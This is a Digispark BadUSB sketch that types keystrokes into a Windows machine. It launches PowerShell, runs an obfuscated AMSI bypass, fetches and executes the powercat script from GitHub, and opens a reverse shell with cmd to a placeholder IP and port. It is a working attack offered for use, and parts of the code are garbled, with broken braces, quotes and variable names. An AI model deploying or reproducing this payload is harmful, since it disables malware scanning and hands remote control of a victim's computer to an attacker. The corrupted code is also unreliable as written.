#include "DigiKeyboard.h"

void typeKey(int key)

DigiKeyboard.sendKeyStroke(key);

void setup()

( //Begin the keyboard session DigiKeyboard begin();

delay(1000); // Wait 1 second

// Send the Windows+R key combination DigiKeyboard.sendKeyStroke(KEY_R,

MOD_GUILLEFT); delay(500); // Wait for the Run dialog to

appear // Type "powershell' and press Enter

DigiKeyboard.println("powershell"); delay(100);

typeKey(KEY_ENTER);

delay(1000); // Wait for PowerShell to open

// Type the AMSI bypass command DigiKeyboard.println("Samsi-[Ref] Assemb

ly.GetType(Sys'+'te'+'m.M+anagement A' +utomation.Am'+'siU'+'tils');");

delay(100);

typeKey(KEY ENTER); DigiKeyboard.println("field=");

delay(100);

typeKey(KEY ENTER);

DigiKeyboard.println("Samsi.GetField(ams

+ilnitF+ailed, NonP+'ublic,S'+'tatic');");

delay(100); typeKey(KEY_ENTER);

Digikeyboard.println("field.SetValue($null,

Strue);");

delay(100); typeKey(KEY_ENTER);
DigiKeyboard.println("IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ");
DigiKeyboard.delay(300);
typeKey(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.println("powercat -c İP ADRES -p PORT -e cmd -v");
DigiKeyboard.delay(500);   
typeKey(KEY_ENTER);
  digitalWrite(1, HIGH); //turn on led when program finishes - You can unplug now 
   DigiKeyboard.delay(90000); 
   digitalWrite(1, LOW);  
   DigiKeyboard.delay(5000);
